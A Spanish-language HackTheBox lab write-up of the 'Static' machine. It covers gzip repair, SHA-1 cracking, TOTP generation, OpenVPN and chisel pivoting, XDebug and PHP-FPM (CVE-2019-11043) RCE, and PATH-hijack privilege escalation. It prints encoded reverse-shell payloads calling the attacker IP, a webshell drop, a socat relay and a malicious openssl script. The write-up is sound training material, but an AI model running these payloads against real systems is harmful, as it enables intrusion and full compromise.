---
layout: post
render_with_liquid: false
title: "HTB Writeup: Static"
date: 2026-05-21
category: writeups
tags: [htb, linux, hard, fixgz, totp, openvpn, pivoting, chisel, xdebug-rce, php-fpm, cve-2019-11043, path-hijacking, capabilities, ersatool]
platform: HackTheBox
os: Linux
difficulty: Hard
has_exploits: false
exploits_url: /writeups/static/exploit/
resumen: "Recuperación de un gzip corrupto por transferencia FTP en ASCII para extraer credenciales y un secreto TOTP base32. Acceso al portal interno vía 2FA generado con oathtool. Pivoting con OpenVPN, rutas estáticas y chisel hacia tres redes internas. RCE vía XDebug remote_connect_back, RCE en PHP-FPM (CVE-2019-11043) sobre nginx en pki, y escalada a root vía PATH hijacking aprovechando ersatool con cap_setuid+eip que invoca easyrsa."
permalink: /writeups/static/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Hard       |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Recuperación de ficheros corruptos:** `db.sql.gz` dañado por FTP en modo ASCII → `fixgz`
- **Crackeo de hashes:** SHA-1 del password del DB dump (hashcat -m 100)
- **2FA basada en TOTP:** generación de OTP con `oathtool --totp -b` sobre un secreto base32 robado de la BD
- **VPN segmentada:** OpenVPN con CN como credencial → acceso a 172.20.0.0/24 y 192.168.254.0/24 vía rutas estáticas
- **Pivoting:** chisel reverse SOCKS y chisel forward proxy
- **Explotación:** XDebug `remote_connect_back` RCE en el host web, PHP-FPM Underflow RCE (**CVE-2019-11043**) en pki
- **Escalada:** PATH hijacking aprovechando `ersatool` con capability `cap_setuid+eip` que invoca `openssl` por nombre relativo

## Sinopsis

Máquina **Hard** con una arquitectura segmentada en cuatro redes: el front (10.129.x.x), una red `vpn` (172.30.0.0/24), una `web/db` (172.20.0.0/24) y una `pki` (192.168.254.0/24). El punto de entrada es un portal de soporte interno en `:8080/vpn/` con un login + 2FA cuyo backup de base de datos quedó expuesto en `/.ftp_uploads/` — corrupto, por una transferencia FTP en ASCII. Lo reparamos con `fixgz`, extraemos el hash SHA-1 de `admin` (cracking `admin`), recuperamos el secreto base32 del TOTP y entramos al panel.

Desde el panel descargamos una configuración OpenVPN parametrizada por **CN**. La conexión nos da `tun9` con IP `172.30.0.9` y, añadiendo rutas estáticas, alcance a `web` (172.20.0.10) y `pki` (192.168.254.3). El servidor `web` corre Apache con **XDebug `remote_connect_back=On`** — RCE como `www-data` vía el debugger de PHP. Allí encontramos credenciales de **MariaDB** y la flag de usuario.

Para llegar a `pki` montamos un **SOCKS reverso con chisel**, descubrimos que solo expone `:80` (nginx + PHP-FPM/7.1) — vulnerable a **CVE-2019-11043** (PHP-FPM Underflow). Lo explotamos con `phuip-fpizdam` reenviando el tráfico desde `web` con chisel en modo *reverse proxy*. Como `www-data` en `pki`, descubrimos que `/usr/bin/ersatool` tiene **`cap_setuid+eip`** y orquesta llamadas a `/opt/easyrsa/easyrsa` que invoca `openssl` por nombre relativo. Plantamos un `openssl` malicioso en `/tmp`, prependemos `/tmp` al PATH, disparamos `ersatool`, y la cadena ejecuta `chmod u+s /bin/bash` como root.

---

## Reconocimiento

### Escaneo de puertos

Comenzamos con un SYN scan completo de los 65535 puertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.48.123 -oG allPorts
```

![Descubrimiento de puertos abiertos con nmap](/writeups/static/assets/01_nmap_all_ports.png)

La máquina expone únicamente dos puertos:

| Puerto    | Servicio | Versión                        |
| :-------- | :------- | :----------------------------- |
| 22/tcp    | SSH      | OpenSSH 7.9p1 Debian 10+deb10u2 |
| 8080/tcp  | HTTP     | Apache 2.4.38 (Debian)         |

```bash
nmap -sCV -p22,8080 10.129.48.123 -oN targeted
```

![Detección de servicio y versión con nmap -sCV](/writeups/static/assets/02_nmap_service_version.png)

### Exploración web inicial

El servidor en `:8080` apenas devuelve respuesta en `/`. Probamos `/robots.txt`:

![robots.txt revela /vpn/ y /.ftp_uploads/](/writeups/static/assets/03_robots_txt.png)

```
User-agent: *
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

Dos rutas interesantes. `/vpn/login.php` muestra un formulario de autenticación:

![Formulario de login en /vpn/login.php](/writeups/static/assets/04_vpn_login_form.png)

Y `/.ftp_uploads/` permite *directory listing*:

![Index de /.ftp_uploads/ con db.sql.gz y warning.txt](/writeups/static/assets/05_ftp_uploads_index.png)

| Archivo       | Fecha               | Tamaño |
| :------------ | :------------------ | :----- |
| `db.sql.gz`   | 2020-06-18 12:30    | 262    |
| `warning.txt` | 2020-06-19 13:00    | 78     |

El contenido de `warning.txt`:

![Aviso sobre corrupción binaria en transferencia](/writeups/static/assets/06_warning_txt.png)

```
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

> **FTP ASCII vs binario**: el modo ASCII de FTP traduce automáticamente los saltos de línea entre plataformas (`\n` ↔ `\r\n`). Si se aplica a un fichero binario — como un `.gz`, una imagen, o un PDF — se inyectan bytes y el archivo queda corrupto. Mismo patrón que clientes FTP antiguos rompiendo binarios silenciosamente.

### Confirmación del daño

```bash
gunzip db.sql.gz
# gzip: db.sql.gz: invalid compressed data--crc error
# gzip: db.sql.gz: invalid compressed data--length error
```

![gunzip falla con CRC y length errors](/writeups/static/assets/07_gunzip_fail.png)

Intentar leer parcialmente con `gzip -dc db.sql.gz > result` rescata un fragmento ilegible donde se aprecia el esqueleto de un `INSERT INTO users` con dos campos sospechosos:

![Fragmento parcial recuperado: hash SHA-1 y secreto base32](/writeups/static/assets/08_gunzip_garbled.png)

```
... 'admin'lm'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
```

Antes de obsesionarnos con un dump corrupto, también lanzamos `gobuster` sobre `/vpn/`:

```bash
gobuster dir -u http://10.129.48.123:8080/vpn -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x php,html -b 404
```

![Gobuster sobre /vpn/](/writeups/static/assets/09_gobuster_vpn.png)

Solo encontramos `login.php`, `panel.php`, etc. — confirma que el dump corrupto es la única vía hacia las credenciales.

---

## Explotación

### Reparando el gzip corrupto

El proyecto [yonjar/fixgz](http://github.com/yonjar/fixgz) (port del clásico `fixgz` de Jean-loup Gailly, 1998) recorre el fichero eliminando los `\r` extra introducidos por la traducción ASCII.

![Repositorio yonjar/fixgz](/writeups/static/assets/10_fixgz_repo.png)

```bash
g++ fixgz.cpp -o fixgz
./fixgz db.sql.gz db_fixed.sql.gz
gunzip db_fixed.sql.gz
cat db_fixed.sql
```

![fixgz reconstruye el archivo y vemos el INSERT completo](/writeups/static/assets/11_fixgz_execution.png)

```sql
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment,
                    username varchar(20) not null,
                    password varchar(40) not null,
                    totp varchar(16) not null,
                    primary key (id) );

INSERT INTO users (id, username, password, totp)
VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Tenemos:

- **password**: `d033e22ae348aeb5660fc2140aec35850c4da997` (40 hex → SHA-1)
- **totp secret**: `orxxi4c7orxwwzlo` (claramente **base32** por el alfabeto y el padding)

### Cracking del hash

```bash
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

![hashcat recupera la contraseña admin](/writeups/static/assets/12_hashcat_admin.png)

```
d033e22ae348aeb5660fc2140aec35850c4da997:admin
```

Sí, el hash SHA-1 de `admin`. Un clásico.

### Bypass del 2FA TOTP

Al enviar `admin:admin` el portal pide un segundo factor:

![Segundo factor 2FA Enabled](/writeups/static/assets/13_2fa_enabled.png)

El campo `totp` de la BD era el **secreto base32** para generar el código TOTP RFC 6238. Lo usamos con `oathtool`:

```bash
oathtool --totp -b 'orxxi4c7orxwwzlo'
# 870248
```

![oathtool genera el TOTP a partir del secreto base32](/writeups/static/assets/14_oathtool_totp.png)

> **¿Por qué `-b`?**: `-b` indica que el secreto está codificado en **base32**, que es el formato estándar de TOTP (Google Authenticator y similares). Los caracteres del secreto (`orxxi4c7orxwwzlo`) caen todos en el alfabeto base32 RFC 4648, sin caracteres `0`, `1`, `8` ni `9`.

> **NTP es crítico**: TOTP usa el tiempo Unix como nonce (intervalo de 30 s por defecto). Si nuestro reloj difiere más de un *step* del de la máquina, el código no valida. Sincroniza con `ntpdate` o, si la víctima expone NTP, fuerza el reloj manualmente antes de generarlo.

Introducimos `870248` en el campo OTP y accedemos al panel interno:

![Static Inc. — Internal IT Support portal con la tabla de servidores](/writeups/static/assets/15_static_panel.png)

| Server | Address          | Status  |
| :----- | :--------------- | :------ |
| pub    | 172.17.0.10      | Offline |
| web    | 172.20.0.10      | Online  |
| db     | 172.20.0.11      | Online  |
| vpn    | 172.30.0.1       | Online  |
| pki    | 192.168.254.3    | Online  |

El portal incluye un formulario *Common Name = [____] Generate* que produce un `static.ovpn`. Lo descargamos.

---

## Pivoting inicial — entrando a la red interna por VPN

### Conexión OpenVPN

```bash
sudo openvpn static.ovpn
```

![OpenVPN conectado en tun9](/writeups/static/assets/16_openvpn_connection.png)

OpenVPN levanta `tun9` con IP `172.30.0.9/24`:

![Configuración de rutas inicial — solo 172.30.0.0/24 alcanzable](/writeups/static/assets/17_vpn_tun9_routes.png)

El push solo añade la red `172.30.0.0/24`. Los segmentos `172.20.0.0/24` (web/db) y `192.168.254.0/24` (pki) no son alcanzables aún.

### Rutas estáticas manuales

El gateway de la red VPN — `172.30.0.1` — sí conoce el resto de redes internas. Forzamos las rutas:

```bash
sudo ip route add 172.20.0.0/24 via 172.30.0.1 dev tun9
sudo ip route add 192.168.254.0/24 via 172.30.0.1 dev tun9
```

![Rutas estáticas añadidas hacia los segmentos internos](/writeups/static/assets/18_static_routes_added.png)

> **Por qué funciona**: el servidor OpenVPN no nos *anuncia* las rutas en el push, pero su tabla de rutas internas sí cubre los otros segmentos. Al inyectarlas manualmente del lado cliente, el tráfico se tunela igualmente. *Cuesta cero probarlo y no rompe nada si fallan.*

### Reconocimiento sobre 172.20.0.10 (web)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.20.0.10 -oG allPorts_web
nmap -sCV -p22,80 172.20.0.10 -oN targeted_web
```

![Servicios en 172.20.0.10 — Apache 2.4.29 y SSH 7.6p1](/writeups/static/assets/20_nmap_web_internal.png)

El index muestra el mismo branding *Static Inc.*. Probamos `/vpn/src/`:

![Listing de /vpn/src/ con Base32.php, Hotp.php, Totp.php](/writeups/static/assets/19_vpn_src_listing.png)

El servidor también tiene `phpinfo.php` accesible. La cabecera **XDebug** es la que rompe la máquina:

![phpinfo muestra xdebug.remote_connect_back=On y puerto 9000](/writeups/static/assets/22_phpinfo_xdebug.png)

| Parámetro                       | Valor       |
| :------------------------------ | :---------- |
| `xdebug.remote_enable`          | `On`        |
| `xdebug.remote_connect_back`    | **`On`**    |
| `xdebug.remote_handler`         | `dbgp`      |
| `xdebug.remote_port`            | `9000`      |
| `xdebug.remote_mode`            | `req`       |

> **El bug `remote_connect_back`**: cuando está activado, XDebug ignora `xdebug.remote_host` y abre una conexión TCP **al cliente que disparó la sesión de debug** (campo `$_SERVER['REMOTE_ADDR']`). Cualquier visitante con `?XDEBUG_SESSION_START=algo` provoca que el intérprete PHP nos conecte a nuestro puerto 9000 y acepte instrucciones DBGp — incluido `eval()`. Es **RCE remoto sin autenticación**.

### Reconocimiento sobre 192.168.254.3 (pki)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.254.3 -oG allPorts_pki
```

![SYN scan en pki — pocas respuestas](/writeups/static/assets/21_nmap_pki_internal.png)

La máquina apenas devuelve nada en el primer escaneo. La dejamos aparcada — entraremos por aquí después de tener foothold en `web`.

---

## RCE en web vía XDebug

Usamos el PoC público (`php/xdebug-rce/exp.py`).

### Verificación con `system('id')`

Levantamos el listener DBGp y lanzamos:

```bash
python3 xdebug_rce.py -c "system('id');" -t "http://172.20.0.10/info.php"
```

En paralelo, el exploit nos pide tirar una petición:

```bash
curl -s "http://172.20.0.10/info.php?XDEBUG_SESSION_START=ghostvyle"
```

![XDebug ejecuta system('id') y devuelve uid=33(www-data)](/writeups/static/assets/23_xdebug_rce_id.png)

```
INFO - [+] Server ('0.0.0.0', 9000) started
INFO - [+] Server ('0.0.0.0', 9003) started
INFO - [+] Trigger debug session
INFO - [+] Recieve data from ('172.30.0.1', 42216)
INFO - [+] Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmado.

### Reverse shell

Adaptamos el comando a un shell de Python (clásico `pty.spawn`) codificado en URL para evitar `badchars`:

```bash
python3 xdebug_rce.py -c "system(base64_decode('cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTcyLjMwLjAuOSIsNzc3NykpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9iYXNoIik='));" -t "http://172.20.0.10/info.php"
rlwrap nc -lvnp 7777
```

![Reverse shell recibida como www-data en web](/writeups/static/assets/24_xdebug_revshell.png)

Somos `www-data@web`.

### Credenciales de MariaDB

```bash
cat /var/www/html/vpn/database.php
```

![database.php con credenciales root/2108@C00l](/writeups/static/assets/25_database_credentials.png)

```php
<?php
$servername = "db";
$username   = "root";
$password   = "2108@C00l";
$dbname     = "static";
?>
```

Probamos la conexión al servidor `db` (172.20.0.11):

```bash
mysql -h 172.20.0.11 -u root -p --ssl=0
# Password: 2108@C00l
```

![MariaDB 10.4.12 alcanzable desde web](/writeups/static/assets/26_mysql_db_connect.png)

No hay nada explotable directamente en la BD para llegar a root. La flag de usuario está en `/home/www/user.txt`:

![Listado de /home y flag de usuario](/writeups/static/assets/26b_user_flag.png)

---

## Pivoting profundo — chisel hacia pki

`pki` (192.168.254.3) está accesible desde `web` (172.20.0.10) pero no desde nuestra máquina atacante por el comportamiento del routing. Necesitamos un **proxy SOCKS** sobre nuestra conexión a `web` para explotarlo cómodamente.

### Chisel reverso (SOCKS desde la víctima)

En la máquina atacante:

```bash
chisel server --reverse -p 7171
```

Trasladamos el binario a `web` (servidor HTTP local sobre `tun9`, luego `wget` desde la víctima):

```bash
# (atacante) sirve el binario
python3 -m http.server 8000

# (web) descarga y ejecuta
wget http://172.30.0.9:8000/chisel
chmod +x chisel
```

![Transferencia de chisel a web](/writeups/static/assets/27_chisel_transfer.png)

```bash
# (web) conecta al servidor reverso del atacante
./chisel client 172.30.0.9:7171 R:1080:socks
```

![Túnel reverso establecido, SOCKS escuchando en 127.0.0.1:1080](/writeups/static/assets/28_chisel_reverse_tunnel.png)

> **Cómo lee la línea R:1080:socks**: pedimos al cliente (web) que abra un *socks server* y que el atacante escuche en `127.0.0.1:1080` para alcanzarlo. Todo el tráfico SOCKS local se tunela por el WebSocket hasta web, y desde web sale hacia donde queramos.

### Configuramos `proxychains4`:

```conf
# /etc/proxychains4.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```

### Reconocimiento de pki vía proxychains

```bash
proxychains -q nmap -sT -Pn -n --open --top-ports 1000 192.168.254.3 -oG ports
```

![nmap sobre pki: solo 80/tcp abierto](/writeups/static/assets/29_proxychains_nmap_pki.png)

```
PORT   STATE SERVICE
80/tcp open  http
```

`curl` directo a `http://192.168.254.3` devuelve un texto curioso:

```
batch mode: /usr/bin/ersatool create|print|revoke CN
```

Es la salida del binario `ersatool` impresa por un `passthru()` PHP, sugerencia clara: la web es un wrapper sobre `ersatool` y espera un parámetro `cn` para crear certificados. Pero más interesante todavía — el banner del servidor:

```
Server: nginx/1.14.0 (Ubuntu)
X-Powered-By: PHP-FPM/7.1
```

---

## RCE en pki vía CVE-2019-11043 (PHP-FPM Underflow)

```bash
searchsploit PHP-FPM
```

![searchsploit PHP-FPM — exploit 47553.md](/writeups/static/assets/30_searchsploit_phpfpm.png)

`47553.md` referencia **CVE-2019-11043**: un underflow en la implementación de FastCGI de PHP-FPM cuando se combina con la directiva `fastcgi_split_path_info` mal configurada en nginx. Permite escribir valores arbitrarios en variables PHP-FPM (`PHP_VALUE`) y, en particular, inyectar `auto_prepend_file=php://input` con código PHP arbitrario en el body.

El PoC oficial es `phuip-fpizdam` (Neex). Necesita poder hablar HTTP **directamente** con el nginx víctima, pero la herramienta no soporta proxy SOCKS5 nativamente. Solución: **chisel forward proxy** desde `web` hacia `pki`, expuesto en un puerto local de `web` que sí tunelamos con el SOCKS reverso (recursivo).

### Forward proxy desde web hacia pki

```bash
# (web) chisel server actuando como reverse proxy a pki:80
./chisel server --port 7777 --proxy http://192.168.254.3
```

![chisel en web sirviendo como reverse proxy a pki](/writeups/static/assets/31_chisel_forward_proxy.png)

Comprobamos desde el atacante (a través del SOCKS):

```bash
curl -v http://172.20.0.10:7777
```

> **¿Por qué el truco doble?** El SOCKS reverso nos da alcance a `172.20.0.10:7777`. Ahí monto un proxy HTTP que reenvía a `192.168.254.3:80`. Resultado: para mí, el endpoint accesible es `172.20.0.10:7777`, y para el exploit es como si hablara con un nginx local.

### Disparando phuip-fpizdam

```bash
~/go/bin/phuip-fpizdam http://172.20.0.10:7777/index.php
```

![phuip-fpizdam consigue RCE: "Trying to set hello/REMEMBER THIS"](/writeups/static/assets/32_phuip_fpizdam.png)

```
[2026/05/15 20:00:33] Base status code is 200
[2026/05/15 20:00:33] Status code 502 for qsl=1755, dropping...
...
[2026/05/15 20:01:07] Got attack output: REMEMBER THIS
[2026/05/15 20:01:08] Successful! Write a shell now (parameter ?a= to URLs)
```

Tras unos minutos, el exploit confirma: añadiendo `?a=` a las URLs podemos pasar PHP arbitrario. Verificamos:

```bash
curl 'http://172.20.0.10:7777/index.php?a=ls+-la'
```

![Ejecución de ls -la vía ?a=](/writeups/static/assets/33_pki_rce_ls.png)

```
total 16
drwxr-xr-x 3 root     root     4096 Sep 20  2022 .
drwxr-xr-x 3 root     root     4096 Sep 20  2022 ..
-rw-r--r-- 1 root     root      174 Apr  4  2020 index.php
drwxr-xr-x 2 www-data www-data 4096 Sep 20  2022 uploads
```

### Webshell persistente

Dropeamos una webshell en `uploads/` (que sí es escribible por www-data):

```bash
curl 'http://172.20.0.10:7777/index.php?a=echo+%27%3C%3Fphp+system(%24_GET%5B%22c%22%5D)%3B+%3F%3E%27+%3E+uploads/shell.php'
curl 'http://172.20.0.10:7777/uploads/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![Webshell instalada en uploads/shell.php](/writeups/static/assets/34_pki_shell_upload.png)

### Reverse shell de pki — relay con socat

`pki` no puede contactarnos directamente: sale al exterior solo por `web` (172.30.0.9). Necesitamos un *relay* TCP en `web` que reenvíe la reverse shell.

```bash
# (atacante) sirve socat
python3 -m http.server 8000

# (web) descarga socat
wget http://172.30.0.9:8000/socat
chmod +x socat
```

![socat transferido a web](/writeups/static/assets/35_socat_transfer.png)

```bash
# (web) abre el relay: lo que llegue a web:4444 → atacante:4444
./socat TCP-LISTEN:4444,fork TCP:172.30.0.9:4444 &
```

![socat en web reenviando 4444 → atacante:4444](/writeups/static/assets/36_socat_relay.png)

```bash
# (atacante) listener
rlwrap nc -lvnp 4444

# (atacante) dispara python reverse shell vía webshell
curl 'http://172.20.0.10:7777/uploads/shell.php?c=python3%20-c%20%27import%20socket%2Cpty%2Cos%3Bs%3Dsocket.socket()%3Bs.connect((%22172.20.0.10%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn(%22%2Fbin%2Fbash%22)%27'
```

![Reverse shell como www-data en pki](/writeups/static/assets/37_pki_shell_received.png)

```
connect to [172.30.0.9] from (UNKNOWN) [172.30.0.1] 36682
www-data@pki:~/html/uploads$
```

---

## Escalada de privilegios — www-data → root en pki

### Análisis del entorno

```bash
cat /var/www/html/index.php
```

![index.php de pki: passthru sobre ersatool con cn sanitizado](/writeups/static/assets/38_pki_index_php.png)

```php
<?php
header('X-Powered-By: PHP-FPM/7.1');
//cn needs to be parsed!!!
$cn = preg_replace("/[^A-Za-z0-9 ]/", '', $_GET['cn']);
echo passthru("/usr/bin/ersatool create ".$cn);
?>
```

El parámetro `cn` se sanitiza dejando solo `A-Za-z0-9` y espacio — descarta inyección de comandos clásica. Pero `ersatool` tiene capabilities:

```bash
getcap /usr/bin/ersatool
# /usr/bin/ersatool = cap_setuid+eip
```

![ersatool con cap_setuid+eip](/writeups/static/assets/39_ersatool_getcap.png)

> **`cap_setuid+eip`**: el binario puede llamar a `setuid(0)` y convertirse en root. No es SUID, así que no necesita pertenecer a root — pero ejerce el mismo efecto: cuando se ejecute, podrá escalar a UID 0 dentro de su propio proceso.

### Trazando el comportamiento de ersatool

Subimos `pspy64` (mismo relay) para observar lo que pasa cuando se invoca `ersatool create <CN>`:

> **Nota práctica**: en pki el binario `curl` está bloqueado o filtrado. Como workaround, descargamos como `_curl` (`mv curl _curl` localmente, o subimos un `wget` en su lugar). Aparece en las trazas como `__curl http://192.168.254.2:8000/pspy64 > pspy`.

![Renombrado de curl como _curl para evitar el filtrado](/writeups/static/assets/40_underscored_curl_trick.png)

```bash
./pspy64 -p -f
```

Disparamos el endpoint con `curl 'http://172.20.0.10:7777/?cn=algo'` y observamos en pspy:

![pspy: ersatool → easyrsa build-client-full → openssl req (sin ruta absoluta)](/writeups/static/assets/41_pspy_easyrsa_openssl.png)

La cadena de procesos como `UID=0`:

```
/usr/bin/ersatool create <CN>
  └─ /bin/sh /opt/easyrsa/easyrsa build-client-full <CN> nopass batch
       └─ openssl req -utf8 -new -newkey rsa:2048 -keyout ... -out ...
```

**`easyrsa` invoca `openssl` por nombre relativo**. El script bash `easyrsa` no fija un `PATH` interno explícito; hereda el del padre. Si conseguimos meter `/tmp` (o cualquier directorio escribible) al frente del PATH antes de que `ersatool` lance la cadena, controlaremos qué binario se ejecuta como root.

### Plantando el openssl malicioso

```bash
cat > /tmp/openssl <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /tmp/openssl
```

![/tmp/openssl preparado con chmod u+s /bin/bash](/writeups/static/assets/42_malicious_openssl.png)

```bash
export PATH=/tmp:$PATH
```

![PATH prependiendo /tmp](/writeups/static/assets/43_export_path.png)

Disparamos `ersatool` desde nuestra shell (que ahora hereda PATH=/tmp:...):

```bash
/usr/bin/ersatool create whatever
```

`ersatool` hace `setuid(0)`, lanza `easyrsa`, que ejecuta `openssl req ...`. La resolución de `openssl` por PATH coge **/tmp/openssl** primero. Y se ejecuta como **root**.

![pspy: chmod u+s /bin/bash ejecutado por UID=0](/writeups/static/assets/44_pspy_chmod_suid.png)

```
2026/05/16 17:18:37 CMD: UID=0 PID=1312 | chmod u+s /bin/bash
2026/05/16 17:18:37 CMD: UID=0 PID=1313 | /bin/sh /opt/easyrsa/easyrsa build-client-full whatever nopass batch
```

### Bash con SUID + opción `-p`

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
/bin/bash -p
```

![/bin/bash -p mantiene EUID=0 → whoami root](/writeups/static/assets/45_bash_p_root.png)


### Flag de root

```bash
cat /root/root.txt
# 134fa96617e2dd04ad344a17eeb13814
```

![Flag de root](/writeups/static/assets/46_root_flag.png)

Somos **root** en **pki**, el último nodo de Static.

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados.
